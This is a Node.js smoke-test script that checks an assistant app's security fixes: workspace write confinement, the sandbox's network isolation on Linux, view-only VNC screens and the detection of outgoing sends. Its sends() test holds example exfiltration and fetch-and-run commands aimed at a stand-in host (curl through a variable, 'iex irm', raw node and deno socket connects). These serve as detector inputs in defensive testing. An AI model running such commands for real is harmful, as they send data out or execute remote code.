/**
 * smoke-sec1563.mjs - 1.5.63 security fixes (Linux sandbox and bot screens).
 *
 *   F10  (both) a new file or folder in the workspace is made through its folder held open
 *        (Linux: /proc/self/fd/N/<name>): never in the data folder, not even empty.
 *        SECV-N2b/N2c (smoke-secv1560b.mjs) are the race itself; here the plain cases.
 *   NET  the strict sandbox's own network: the pieces (all systems), and on Linux with bwrap
 *        and pasta / slirp4netns the real thing - no loopback port of this machine, no
 *        abstract socket, the internet still there, a loopback proxy let through (pasta), and
 *        a helper that fails = SANDBOX_UNAVAILABLE with nothing run.
 *   SCR  bot screens: x11vnc -viewonly / wayvnc --disable-input when 接管桌面 is 「只能看」,
 *        wayvnc on a unix socket in data/desktop-vnc (the hub bridges it), no websockify needed.
 *   OUT  very-low sends: a program run through a variable with an address, Node's raw
 *        sockets on the line, assigning people and asking for reviewers.
 *
 *   node scripts/smoke-sec1563.mjs     PASS / FAIL / SKIP lines, exit 1 on a FAIL
 * Each case runs in a process of its own (store.mjs fixes its folders when it loads).
 */
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import net from 'node:net';
import http from 'node:http';
import dns from 'node:dns';
import { spawnSync } from 'node:child_process';
import { fileURLToPath, pathToFileURL } from 'node:url';

const ME = fileURLToPath(import.meta.url);
const REPO = path.resolve(path.dirname(ME), '..');
const src = (name) => pathToFileURL(path.join(REPO, 'src', name)).href;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const linkKind = process.platform === 'win32' ? 'junction' : 'dir';

// ---------------------------------------------------------------- F10
async function f10() {
  const S = await import(src('safefs.mjs'));
  const ws = process.env.ASSIST_WORKSPACE_DIR;
  const data = process.env.ASSIST_DATA_DIR;
  fs.mkdirSync(ws, { recursive: true });
  fs.mkdirSync(data, { recursive: true });
  fs.mkdirSync(path.join(ws, 'inner'), { recursive: true });
  fs.symlinkSync(data, path.join(ws, 'out'), linkKind);
  fs.symlinkSync(path.join(ws, 'inner'), path.join(ws, 'in'), linkKind);
  fs.writeFileSync(path.join(ws, 'file.txt'), 'x');
  const code = async (fn) => { try { await fn(); return 'ok'; } catch (err) { return err.code || err.message; } };
  const round = async (tag) => {
    const r = {};
    r.nested = await code(() => S.saveInside(ws, path.join(ws, tag, 'a', 'b', 'c.txt'), 'hello'));
    r.nestedContent = fs.existsSync(path.join(ws, tag, 'a', 'b', 'c.txt')) && fs.readFileSync(path.join(ws, tag, 'a', 'b', 'c.txt'), 'utf8') === 'hello';
    r.mkdirOut = await code(() => S.mkdirInside(ws, path.join(ws, 'out', `${tag}-x`, 'y')));
    r.saveOut = await code(() => S.saveInside(ws, path.join(ws, 'out', `${tag}-f.json`), 'EVIL'));
    r.saveOutDeep = await code(() => S.saveInside(ws, path.join(ws, 'out', `${tag}-d`, 'f.json'), 'EVIL'));
    r.inData = fs.readdirSync(data).filter((n) => n.startsWith(tag));
    r.throughInside = await code(() => S.saveInside(ws, path.join(ws, 'in', `${tag}-z`, 'f.txt'), 'in'));
    r.landedInside = fs.existsSync(path.join(ws, 'inner', `${tag}-z`, 'f.txt'));
    r.underFile = await code(() => S.mkdirInside(ws, path.join(ws, 'file.txt', 'sub')));
    r.append = await code(() => S.writeInside(ws, path.join(ws, `${tag}-log.txt`), 'a', { append: true }));
    return r;
  };
  const out = { held: process.platform === 'linux' && fs.existsSync('/proc/self/fd'), main: await round('m') };
  // The other systems' way (no held folders), on Linux too: still refused, still writes.
  S._safefsTest.setHeldFolders(false);
  out.fallback = await round('f');
  S._safefsTest.setHeldFolders(true);
  return out;
}

// ---------------------------------------------------------------- NET: the pieces
async function netUnits() {
  const SB = await import(src('sandbox.mjs'));
  const out = {};
  out.proxy = SB.loopbackProxyPorts({ HTTPS_PROXY: 'http://127.0.0.1:7890', all_proxy: 'socks5://localhost:1080', HTTP_PROXY: 'http://proxy.example:8080', NO_PROXY: '127.0.0.1' }).join(',') === '1080,7890'
    && SB.loopbackProxyPorts({}).length === 0 && SB.loopbackProxyPorts({ HTTPS_PROXY: '127.0.0.1:3128' }).join() === '3128';
  const rc = SB.resolvConfText('pasta', 'nameserver 127.0.0.53\nsearch lan.example\noptions edns0 trust-ad\n');
  out.resolv = rc.includes(`nameserver ${SB.PASTA_DNS}`) && rc.includes('search lan.example') && rc.includes('options edns0') && !rc.includes('127.0.0.53')
    && SB.resolvConfText('slirp4netns', 'nameserver 127.0.0.53\n').includes(`nameserver ${SB.SLIRP_DNS}`);
  const [pf, pa] = SB.netHelperCommand('pasta', 42, { proxyPorts: [7890] });
  const [, pn] = SB.netHelperCommand('pasta', 42, {});
  const opt = (a, k) => a[a.indexOf(k) + 1];
  out.pasta = pf === 'pasta' && pa.includes('--config-net') && pa.includes('--no-map-gw') && opt(pa, '-t') === 'none' && opt(pa, '-u') === 'none' && opt(pa, '-T') === '7890' && opt(pa, '-U') === 'none'
    && opt(pa, '--dns-forward') === SB.PASTA_DNS && !pa.includes('--pid') && pa[pa.length - 1] === '42' && opt(pn, '-T') === 'none' && !pa.includes('auto');
  // pasta left in the background for one sandbox is found by its command line (to end it with the sandbox).
  const proc = path.join(process.env.ASSIST_HOME, 'proc');
  const fake = (pid, argv) => { fs.mkdirSync(path.join(proc, String(pid)), { recursive: true }); fs.writeFileSync(path.join(proc, String(pid), 'cmdline'), `${argv.join('\0')}\0`); };
  fake(101, ['/usr/bin/pasta', ...pa.slice(0, -1), '42']);
  fake(102, ['/usr/bin/pasta', '--config-net', '43']);
  fake(103, ['/usr/bin/vim', '--config-net', '42']);
  fake(104, ['pasta', '42']);
  out.findPasta = SB.pastaPidsFor(42, { procDir: proc }).join() === '101';
  const [sf, sa] = SB.netHelperCommand('slirp4netns', 42, {});
  out.slirp = sf === 'slirp4netns' && sa.includes('--disable-host-loopback') && sa.includes('--configure') && sa.slice(-2).join(' ') === '42 tap0';
  const net = { helper: 'pasta', resolv: { file: '/d/sandbox-net/resolv-pasta.conf', at: '/run/systemd/resolve/stub-resolv.conf' } };
  const strict = SB.bwrapArgs({ mode: 'strict', root: '/r', dataDir: '/r/data', workspaceDir: '/r/ws', net, exists: () => true });
  const open = SB.bwrapArgs({ mode: 'open', root: '/r', dataDir: '/r/data', workspaceDir: '/r/ws', net, exists: () => true });
  const plain = SB.bwrapArgs({ mode: 'strict', root: '/r', dataDir: '/r/data', workspaceDir: '/r/ws', exists: () => true });
  out.args = strict.includes('--unshare-net') && strict.join(' ').includes('--ro-bind /d/sandbox-net/resolv-pasta.conf /run/systemd/resolve/stub-resolv.conf')
    && !open.includes('--unshare-net') && !plain.includes('--unshare-net');
  // The start-up decision, with stand-ins for "installed?" and the probe.
  const decide = async ({ have = [], ok = [], env = {} }) => SB.checkSandboxNet({
    platform: 'linux', env, workspaceDir: '/w',
    runImpl: async (file, args) => ({ code: file === 'sh' && have.some((h) => String(args[1]).endsWith(`command -v ${h}`)) ? 0 : 1, out: '' }),
    probe: async (helper) => (ok.includes(helper) ? { ok: true, why: '' } : { ok: false, why: 'probe failed' }),
  });
  out.decide = {
    none: await decide({}),
    pasta: await decide({ have: ['pasta', 'slirp4netns'], ok: ['pasta', 'slirp4netns'] }),
    slirpWhenPastaFails: await decide({ have: ['pasta', 'slirp4netns'], ok: ['slirp4netns'] }),
    slirpWithLoopbackProxy: await decide({ have: ['slirp4netns'], ok: ['slirp4netns'], env: { HTTPS_PROXY: 'http://127.0.0.1:7890' } }),
    off: await decide({ have: ['pasta'], ok: ['pasta'], env: { DESK_SANDBOX_NET: 'shared' } }),
    chosen: await decide({ have: ['pasta', 'slirp4netns'], ok: ['pasta', 'slirp4netns'], env: { DESK_SANDBOX_NET: 'slirp4netns' } }),
  };
  SB._setSandboxNetForTests({ state: 'na' });
  const tools = fs.readFileSync(path.join(REPO, 'src', 'tools.mjs'), 'utf8');
  const server = fs.readFileSync(path.join(REPO, 'src', 'server.mjs'), 'utf8');
  out.wired = tools.includes("boxed?.ready.catch((err) => { netFailed = err.message; kill(); });") && tools.includes("error: { code: 'SANDBOX_UNAVAILABLE'")
    && tools.includes('It has a network of its own: the internet works')
    && server.includes("checkupItem('sandbox-net', '沙箱网络', 'warn'");
  return out;
}

// ---------------------------------------------------------------- NET: the real thing (Linux)
const NET_PROBE = String.raw`
const net = require('node:net'); const fs = require('node:fs');
const [loopPort, abstractName, proxyPort, host] = process.argv.slice(2);
const tcp = (opts) => new Promise((r) => { const s = net.connect(opts); const t = setTimeout(() => { s.destroy(); r('timeout'); }, 6000);
  s.on('connect', () => { clearTimeout(t); s.destroy(); r('open'); }); s.on('error', (e) => { clearTimeout(t); r(e.code || 'error'); }); });
(async () => {
  const out = { ns: fs.readlinkSync('/proc/self/ns/net') };
  out.loopback = await tcp({ host: '127.0.0.1', port: Number(loopPort) });
  out.abstract = await tcp({ path: '\0' + abstractName });
  if (Number(proxyPort)) out.proxy = await tcp({ host: '127.0.0.1', port: Number(proxyPort) });
  if (host) {
    out.dns = await new Promise((r) => require('node:dns').lookup(host, (e, a) => r(e ? (e.code || 'error') : a)));
    out.internet = /^\d+\.\d+\.\d+\.\d+$|:/.test(out.dns) ? await tcp({ host: out.dns, port: 443 }) : 'no-dns';
  }
  console.log(JSON.stringify(out));
})();
`;
async function netLive() {
  if (process.platform !== 'linux') return { skipped: 'Linux only' };
  if (spawnSync('bwrap', ['--version']).status !== 0) return { skipped: 'no bwrap here' };
  const SB = await import(src('sandbox.mjs'));
  const { runShellCommand } = await import(src('tools.mjs'));
  const ws = process.env.ASSIST_WORKSPACE_DIR;
  const data = process.env.ASSIST_DATA_DIR;
  fs.mkdirSync(ws, { recursive: true });
  fs.mkdirSync(data, { recursive: true });
  if (/^\/(home|root)\//.test(process.execPath)) return { skipped: 'node is under /home here (hidden in the sandbox)' };
  const probeFile = path.join(ws, 'netprobe.cjs');
  fs.writeFileSync(probeFile, NET_PROBE);
  const listen = (opts) => new Promise((resolve, reject) => { const s = net.createServer((c) => { c.on('error', () => {}); c.end('hi'); }); s.once('error', reject); s.listen(opts, () => resolve(s)); });
  const loop = await listen({ host: '127.0.0.1', port: 0 });
  const proxy = await listen({ host: '127.0.0.1', port: 0 });
  const abstractName = `lamplit-n63-${process.pid}`;
  const abs = await listen({ path: `\0${abstractName}` });
  const hostNs = fs.readlinkSync('/proc/self/ns/net');
  // The internet is expected inside only where this machine itself reaches it.
  const target = 'github.com';
  const hostNet = await new Promise((r) => dns.lookup(target, (e, a) => r(e ? '' : a)));
  const out = { hostNs, hostInternet: Boolean(hostNet), helpers: {} };
  const run = async (helper, { proxyPorts = [], command = null } = {}) => {
    const n = SB.sandboxNet(helper, { dataDir: data });
    const sandbox = { mode: 'strict', args: SB.bwrapArgs({ mode: 'strict', root: '', dataDir: data, workspaceDir: ws, folders: [], tmpDir: '', net: n }), net: { helper, proxyPorts }, env: null };
    const cmd = command || `'${process.execPath}' '${probeFile}' ${loop.address().port} ${abstractName} ${proxyPorts[0] || 0} ${hostNet ? target : ''}`;
    const r = await runShellCommand(cmd, { cwd: ws, timeoutMs: 40000, sandbox });
    try { return { ...JSON.parse(String(r.stdout).trim().split('\n').pop()), exitCode: r.exitCode }; } catch { return { failed: `${r.error?.code || ''} ${r.sandboxError || ''} ${r.stdout} ${r.stderr}`.slice(-400) }; }
  };
  for (const helper of ['pasta', 'slirp4netns']) {
    if (spawnSync('sh', ['-c', `command -v ${helper}`]).status !== 0) { out.helpers[helper] = { notInstalled: true }; continue; }
    const probe = await SB.probeSandboxNet(helper, { workspaceDir: ws });
    const h = { probe, plain: await run(helper) };
    if (helper === 'pasta') h.proxied = await run(helper, { proxyPorts: [proxy.address().port] });
    out.helpers[helper] = h;
  }
  // Fails closed: a helper that does not work -> SANDBOX_UNAVAILABLE, and the command never ran.
  const fakeDir = path.join(os.tmpdir(), `n63-fake-${process.pid}`);
  fs.mkdirSync(fakeDir, { recursive: true });
  fs.writeFileSync(path.join(fakeDir, 'pasta'), '#!/bin/sh\necho "pasta: refusing for the test" >&2\nexit 1\n', { mode: 0o755 });
  const marker = path.join(ws, 'ran-anyway');
  const savedPath = process.env.PATH;
  process.env.PATH = `${fakeDir}:${savedPath}`;
  let failed;
  try {
    const n = SB.sandboxNet('pasta', { dataDir: data });
    const sandbox = { mode: 'strict', args: SB.bwrapArgs({ mode: 'strict', root: '', dataDir: data, workspaceDir: ws, folders: [], tmpDir: '', net: n }), net: { helper: 'pasta', proxyPorts: [] }, env: null };
    failed = await runShellCommand(`touch '${marker}'`, { cwd: ws, timeoutMs: 20000, sandbox });
  } finally { process.env.PATH = savedPath; fs.rmSync(fakeDir, { recursive: true, force: true }); }
  out.failClosed = { code: failed?.error?.code || '', ok: failed?.ok, ran: fs.existsSync(marker), said: String(failed?.sandboxError || '').slice(0, 200) };
  for (const s of [loop, proxy, abs]) s.close();
  return out;
}

// ---------------------------------------------------------------- SCR
async function screens(T) {
  const D = await import(src('desktops.mjs'));
  const { bridgeWebSocket } = await import(src('wsbridge.mjs'));
  const data = process.env.ASSIST_DATA_DIR;
  fs.mkdirSync(data, { recursive: true });
  D.configure({ dataDir: data });
  const out = {};
  // View-only reaches the VNC server: a viewer part running the other way is started again.
  const fakeProc = () => ({ killed: false, exitCode: null, kill() { this.killed = true; } });
  const starts = [];
  const sock = path.join(T, 'served');
  fs.writeFileSync(sock, '');
  D._testAddDesktop('vo', { procs: [fakeProc()], webPort: 1, viewSocket: sock, startViewer: async ({ viewOnly = false } = {}) => { starts.push(viewOnly); return [fakeProc()]; } });
  await D.ensureViewer('vo', { viewOnly: false });
  await D.ensureViewer('vo', { viewOnly: false });
  await D.ensureViewer('vo', { viewOnly: true });
  await D.ensureViewer('vo', { viewOnly: true });
  out.viewOnly = starts.join(',') === 'false,true' && D.desktopViewerSocket('vo') === sock;
  D.stopDesktop('vo');
  out.socketPath = D.viewerSocketPath(120) === path.join(data, 'desktop-vnc', 'w120.sock');
  const wl = D.waylandCommands({ display: 121, socket: '/d/desktop-vnc/w121.sock', viewOnly: true });
  out.wayvnc = wl.vnc[0] === 'wayvnc' && wl.vnc[1].join(' ') === '-r --disable-input -u /d/desktop-vnc/w121.sock' && !wl.vnc[1].includes('-w') && !wl.vnc[1].some((a) => /^127\./.test(a));
  const desk = fs.readFileSync(path.join(REPO, 'src', 'desktops.mjs'), 'utf8');
  const srv = fs.readFileSync(path.join(REPO, 'src', 'server.mjs'), 'utf8');
  out.x11viewonly = desk.includes("...(viewOnly ? ['-viewonly'] : [])") && srv.includes("const viewOnly = state.config.policy?.takeover === 'view';") && srv.includes('void ensureViewer(safeDecode(match[1]), { viewOnly })');
  out.noWebsockify = desk.includes("const missing = ['Xvfb', 'x11vnc'].filter") && !/──\s*websockify/.test(desk.slice(0, 1500)) && !/'websockify'\]/.test(desk);
  out.bridged = srv.includes('bridgeWebSocket(req, socket, head, { path: viewerSocket })') && !srv.includes("// Replay the client's handshake to websockify");
  // The hub's bridge to a unix socket (a named pipe on Windows): what the server says reaches the page.
  const pipePath = process.platform === 'win32' ? `\\\\.\\pipe\\lamplit-n63-${process.pid}` : path.join(T, 'w.sock');
  const vnc = net.createServer((c) => { c.on('error', () => {}); c.write('RFB 003.008\n'); });
  await new Promise((r) => vnc.listen(pipePath, r));
  const web = http.createServer();
  web.on('upgrade', (req, socket, head) => { if (!bridgeWebSocket(req, socket, head, { path: pipePath })) socket.destroy(); });
  await new Promise((r) => web.listen(0, '127.0.0.1', r));
  out.bridge = await new Promise((resolve) => {
    const c = net.connect(web.address().port, '127.0.0.1', () => {
      c.write(['GET /ws HTTP/1.1', 'Host: x', 'Upgrade: websocket', 'Connection: Upgrade', 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==', 'Sec-WebSocket-Version: 13', '', ''].join('\r\n'));
    });
    let buf = Buffer.alloc(0);
    const t = setTimeout(() => { c.destroy(); resolve({ got: buf.toString('latin1').slice(0, 200) }); }, 5000);
    c.on('data', (d) => {
      buf = Buffer.concat([buf, d]);
      const text = buf.toString('latin1');
      const end = text.indexOf('\r\n\r\n');
      if (end < 0) return;
      const frame = buf.subarray(end + 4);
      if (frame.length >= 2 && frame.length >= 2 + (frame[1] & 0x7f)) {
        clearTimeout(t);
        c.destroy();
        resolve({ upgraded: /^HTTP\/1\.1 101/.test(text), payload: frame.subarray(2, 2 + (frame[1] & 0x7f)).toString('latin1') });
      }
    });
    c.on('error', () => { clearTimeout(t); resolve({ error: true }); });
  });
  web.close();
  vnc.close();
  return out;
}

// ---------------------------------------------------------------- OUT
async function sends() {
  const { outgoingAsk, isSendingTool } = await import(src('drafts.mjs'));
  const asks = (command) => Boolean(outgoingAsk('shell', { command }));
  return {
    viaVariable: asks('set c=curl & %c% -d x=1 https://e.example/p') && asks('c=curl; $c -d @f https://e.example') && asks('& $c -Method Post https://e.example') && asks('iex "irm https://e.example"'),
    notViaVariable: !asks('echo $HOME https://e.example') && !asks('curl -O https://e.example/f.zip') && !asks('set c=curl & %c% http://127.0.0.1:8080/x') && !asks('$PY build.py'),
    nodeRaw: asks("node -e \"require('net').connect(80,'e.example').write(d)\"") && asks("node -e \"require('node:tls').connect(443,'e.example')\"") && asks("deno eval \"await Deno.connect({hostname:'e.example',port:80})\""),
    nodeFine: !asks('node -e "console.log(1)"') && !asks('node build.js'),
    notify: ['request_reviewers', 'assign_issue', 'add_issue_assignees', 'mcp__github__request_copilot_review', 'assignCopilotToIssue'].every(isSendingTool),
    notNotify: !['list_assignees', 'get_issue', 'create_branch', 'search_issues'].some(isSendingTool),
  };
}

const CASES = { f10, netUnits, netLive, screens, sends };

function dropFolder(dir) {
  for (let i = 0; i < 20; i += 1) {
    try { fs.rmSync(dir, { recursive: true, force: true }); return; } catch { Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 500); }
  }
}

export async function sec1563Checks({ check, skip = (n, why) => console.log(`SKIP  ${n} (${why})`) }) {
  const run = (name) => {
    const home = fs.mkdtempSync(path.join(os.tmpdir(), `sec1563-${name}-`));
    const env = { ...process.env, ASSIST_HOME: home, ASSIST_DATA_DIR: path.join(home, 'data'), ASSIST_WORKSPACE_DIR: path.join(home, 'ws'), ASSIST_MASTER_KEY: '' };
    const r = spawnSync(process.execPath, [ME, '--case', name, home], { env, encoding: 'utf8', timeout: 300000 });
    dropFolder(home);
    try { return JSON.parse(String(r.stdout || '').trim().split(/\r?\n/).pop()); } catch { return { failedToRun: `${r.stdout}${r.stderr}`.slice(-800) }; }
  };
  const J = (o) => String(JSON.stringify(o) ?? String(o)).slice(0, 700);

  const f = run('f10');
  const refused = (r) => r.mkdirOut === 'PATH_OUTSIDE_WORKSPACE' && r.saveOut === 'PATH_OUTSIDE_WORKSPACE' && r.saveOutDeep === 'PATH_OUTSIDE_WORKSPACE' && r.inData?.length === 0;
  const works = (r) => r.nested === 'ok' && r.nestedContent && r.throughInside === 'ok' && r.landedInside && r.underFile === 'ENOTDIR' && r.append === 'ok';
  check(`SEC-F10a saves and folders in the workspace (${f.held ? 'Linux: through the held-open folder' : 'by name, as before'}): new nested ones are made, a link inside is followed, a file on the way is ENOTDIR`, f.main && works(f.main), J(f));
  check('SEC-F10b ... a link to the data folder on the way: refused, and nothing at all is made there (no empty file, no folder)', f.main && refused(f.main), J(f));
  check('SEC-F10c the by-name way (Windows, or Linux without /proc) still refuses and still writes', f.fallback && works(f.fallback) && refused(f.fallback), J(f));

  const u = run('netUnits');
  check('SEC-N63a the sandbox\'s own network, the pieces: loopback proxy ports found; resolv.conf names the helper\'s DNS; pasta maps no loopback port in but the proxy, not the gateway, nothing out (and is found to be ended with its sandbox); slirp4netns without host loopback', u.proxy && u.resolv && u.pasta && u.findPasta && u.slirp, J(u));
  check('SEC-N63b strict mode only: --unshare-net and the sandbox\'s resolv.conf; open (放手) and a machine without a helper share the network as before', u.args, J(u));
  const d = u.decide || {};
  check('SEC-N63c at start: pasta first, slirp4netns when pasta does not work, shared (with the reason for 体检) when none is there, or slirp4netns with a loopback proxy, or DESK_SANDBOX_NET=shared',
    d.none?.state === 'shared' && /passt/.test(d.none.reason) && d.pasta?.state === 'own' && d.pasta.helper === 'pasta'
    && d.slirpWhenPastaFails?.state === 'own' && d.slirpWhenPastaFails.helper === 'slirp4netns'
    && d.slirpWithLoopbackProxy?.state === 'shared' && /7890/.test(d.slirpWithLoopbackProxy.reason)
    && d.off?.state === 'shared' && d.chosen?.state === 'own' && d.chosen.helper === 'slirp4netns', J(d));
  check('SEC-N63d wired: a network that cannot be set up is SANDBOX_UNAVAILABLE (never the shared one); the bot is told; 体检 warns when the network is shared', u.wired, J(u));

  const l = run('netLive');
  if (l.skipped) skip('SEC-N63e-h (Linux, bwrap)', l.skipped);
  else {
    const working = Object.entries(l.helpers || {}).filter(([, h]) => h.probe?.ok);
    if (!working.length) {
      if (process.env.CI) check('SEC-N63e Linux CI: pasta or slirp4netns gives the sandbox a network of its own (ci.yml installs both)', false, J(l));
      else skip('SEC-N63e-g', `neither pasta nor slirp4netns works here: ${J(l.helpers)}`);
    }
    for (const [helper, h] of working) {
      const p = h.plain || {};
      check(`SEC-N63e Linux (${helper}): a sandboxed command is in a network of its own and reaches neither this machine's 127.0.0.1 ports nor an abstract unix socket (the human's X server)`, p.ns && p.ns !== l.hostNs && p.loopback !== 'open' && p.abstract !== 'open' && p.exitCode === 0, J({ helper, h, hostNs: l.hostNs }));
      if (l.hostInternet) check(`SEC-N63f Linux (${helper}): ... and still reaches the internet (DNS and a TCP connection)`, /\d/.test(String(p.dns)) && p.internet === 'open', J({ helper, p }));
      else skip(`SEC-N63f (${helper})`, 'this machine itself has no internet');
      if (helper === 'pasta') check('SEC-N63g Linux (pasta): a loopback proxy the hub\'s environment names is let through, that one port only', h.proxied?.proxy === 'open' && h.proxied.loopback !== 'open', J(h.proxied));
    }
    {
      check('SEC-N63h Linux: the helper fails -> SANDBOX_UNAVAILABLE, and the command never ran (not on the shared network either)', l.failClosed?.code === 'SANDBOX_UNAVAILABLE' && l.failClosed.ok === false && !l.failClosed.ran, J(l.failClosed));
    }
  }

  const s = run('screens');
  check('SEC-SCR1 接管桌面 「只能看」 reaches the VNC server (x11vnc -viewonly, wayvnc --disable-input): a viewer part running the other way is started again', s.viewOnly && s.x11viewonly, J(s));
  check('SEC-SCR2 wayvnc (Rocky 10) listens on a unix socket in data/desktop-vnc (no port, no password to leak); the hub bridges it to the page', s.wayvnc && s.socketPath && s.bridged && s.bridge?.upgraded && s.bridge.payload === 'RFB 003.008\n', J(s));
  check('SEC-SCR3 a bot screen no longer needs websockify (nor the system\'s noVNC); the diagram says so', s.noWebsockify, J(s));

  const o = run('sends');
  check('SEC-OUT1 a program run through a variable (%c%, $c, & $c, iex) with an address on the line asks every time; echo $HOME, a plain download, a local address do not', o.viaVariable && o.notViaVariable, J(o));
  check('SEC-OUT2 Node / Deno opening raw connections in code on the line asks every time (a remembered 「以后都允许 node」 does not cover it)', o.nodeRaw && o.nodeFine, J(o));
  check('SEC-OUT3 connected apps: assigning people and asking for reviewers notify them, so they count as sends; looking does not', o.notify && o.notNotify, J(o));
}

if (process.argv[2] === '--case') {
  const out = await CASES[process.argv[3]](process.argv[4]);
  console.log(JSON.stringify(out));
  process.exit(0);
} else if (process.argv[1] && fileURLToPath(import.meta.url) === path.resolve(process.argv[1])) {
  let failed = 0;
  await sec1563Checks({ check: (name, ok, detail) => { console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${ok ? '' : `\n      ${detail}`}`); if (!ok) failed += 1; } });
  process.exit(failed ? 1 : 0);
}
